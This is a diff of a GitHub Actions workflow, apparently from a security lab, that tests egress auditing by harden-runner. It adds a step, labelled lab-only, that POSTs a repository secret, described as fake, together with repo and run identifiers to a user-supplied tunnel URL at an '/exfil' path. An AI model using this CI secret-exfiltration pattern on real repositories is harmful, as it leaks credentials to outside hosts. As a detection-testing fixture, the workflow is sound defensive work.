@@ -1,16 +1,34 @@
 name: Unexpected Outbound Calls
+
 on:
   workflow_dispatch:
+    inputs:
+      callback_url:
+        description: "Tunnel URL from start-goat-lab (https://....trycloudflare.com)"
+        required: true
+
 jobs:
   unexpected-outbound-calls:
-    name: UnexpectedOutboundCalls
     runs-on: ubuntu-latest
     steps:
-      - name: Harden Runner
-        uses: step-security/harden-runner@v2
+      - uses: step-security/harden-runner@v2
         with:
           egress-policy: audit
-      - run: "curl -sS -i -L --max-time 15 https://presidential-wrapping-approve-dot.trycloudflare.com/goat-callback"
-      - run: "curl https://google.com -L  || true"
-      - run: "curl microsoft.com:443  --connect-timeout 5 || true"
-      - run: "curl amazon.com:443  --connect-timeout 5 || true"
+
+      # LAB ONLY: sends a FAKE repo secret to your own receiver to simulate exfiltration.
+      # The URL is passed through env (not ${{ }} inside run:) so the input
+      # cannot inject shell commands. That pattern is itself a GitHub Actions best practice.
+      - name: Simulate secret exfiltration (lab only, fake secret)
+        env:
+          LAB_SECRET: ${{ secrets.GOAT_FAKE_SECRET }}
+          CALLBACK_URL: ${{ inputs.callback_url }}
+        run: |
+          curl -sS -i -L --max-time 15 -X POST \
+            --data "secret=${LAB_SECRET}&repo=${GITHUB_REPOSITORY}&run=${GITHUB_RUN_ID}" \
+            "${CALLBACK_URL%/}/exfil?src=gha-${GITHUB_RUN_ID}"
+
+      - name: Other outbound calls
+        run: |
+          curl https://google.com -L || true
+          curl microsoft.com:443 --connect-timeout 5 || true
+          curl amazon.com:443 --connect-timeout 5 || true
